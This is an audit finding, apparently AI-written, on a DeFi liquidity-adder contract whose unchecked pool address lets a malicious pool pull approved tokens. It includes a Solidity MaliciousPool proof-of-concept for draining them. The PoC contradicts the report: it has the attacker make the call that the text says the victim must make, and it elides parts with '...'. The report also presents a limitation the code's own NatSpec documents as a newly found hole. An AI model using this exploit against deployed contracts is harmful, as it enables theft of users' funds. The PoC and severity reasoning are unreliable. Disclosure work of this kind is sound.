Based on my analysis of the codebase, I found a valid analog to H-08.

---

### Title
Unvalidated `pool` parameter in `MetricOmmPoolLiquidityAdder` allows malicious pool to drain user-approved tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address in `addLiquidityExactShares` and `addLiquidityWeighted` without verifying it against the factory registry. A malicious pool can exploit the transient callback context to pull up to `maxAmountToken0` and `maxAmountToken1` of any ERC-20 tokens from the victim's wallet, because the callback's caller-authentication check is satisfied by the same unvalidated address that was stored as the expected pool.

### Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` accept a caller-supplied `pool` address and immediately store it as the authoritative callback caller in transient storage via `_setPayContext`: [1](#0-0) 

The contract's own NatSpec acknowledges the missing guard: [2](#0-1) 

Inside `metricOmmModifyLiquidityCallback`, the only caller-authentication check is: [3](#0-2) 

Because `expectedPool` was set to the attacker-controlled address, this check passes. The callback then reads `token0`/`token1` directly from `msg.sender` (the malicious pool): [4](#0-3) 

The attacker controls both which tokens are reported and the `amount0Delta`/`amount1Delta` values passed to the callback (up to the victim's stated caps), so `pay(token, payer, maliciousPool, amount)` transfers the victim's pre-approved tokens to the malicious pool.

### Impact Explanation

Any user who has granted a standing ERC-20 approval to `MetricOmmPoolLiquidityAdder` (a normal prerequisite for using the contract) can have those approved balances drained up to `maxAmountToken0` / `maxAmountToken1` in a single transaction. The attacker additionally controls which token addresses are reported via `getImmutables()`, so they can target any token the victim has approved. This is a direct loss of user principal with no protocol-side recovery path.

### Likelihood Explanation

The attack requires the victim to call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-supplied pool address. This is realistic through: a compromised or spoofed frontend, a third-party aggregator that resolves pool addresses from user input, or a social-engineering campaign pointing users at a pool address that looks legitimate. The missing factory check is explicitly documented as a known gap, meaning no future patch is implied by the current code.

### Recommendation

Before calling `_setPayContext` and invoking `pool.addLiquidity`, verify the pool address against the factory registry, analogous to how Uniswap V3's periphery uses `PoolAddress.computeAddress` to authenticate pools:

```solidity
// In _addLiquidity, before _setPayContext:
require(IMetricOmmPoolFactory(factory).isPool(pool), "UnregisteredPool()");
```

Alternatively, derive the expected pool address deterministically from `(token0, token1, fee)` using the factory's CREATE2 salt, and revert if the supplied address does not match.

### Proof of Concept

```solidity
contract MaliciousPool {
    address token0Addr;
    address token1Addr;
    address adder;

    constructor(address _token0, address _token1, address _adder) {
        token0Addr = _token0; token1Addr = _token1; adder = _adder;
    }

    // Implements IMetricOmmPoolActions.addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back into the adder as the "pool"
        IMetricOmmPoolLiquidityAdder(adder)
            .metricOmmModifyLiquidityCallback(
                MAX_AMOUNT_TOKEN0,   // drain full cap
                MAX_AMOUNT_TOKEN1,
                abi.encode(uint8(1)) // KIND_PAY
            );
        return (MAX_AMOUNT_TOKEN0, MAX_AMOUNT_TOKEN1);
    }

    // Implements IMetricOmmPool.getImmutables — attacker controls token addresses
    function getImmutables() external view returns (PoolImmutables memory) {
        return PoolImmutables({token0: token0Addr, token1: token1Addr, ...});
    }
}

// Victim has approved MetricOmmPoolLiquidityAdder for token0 and token1.
// Attacker calls:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    MAX_AMOUNT_TOKEN0,  // victim loses up to this much token0
    MAX_AMOUNT_TOKEN1,  // victim loses up to this much token1
    ""
);
// Result: token0 and token1 transferred from victim to maliciousPool.
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-196)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```
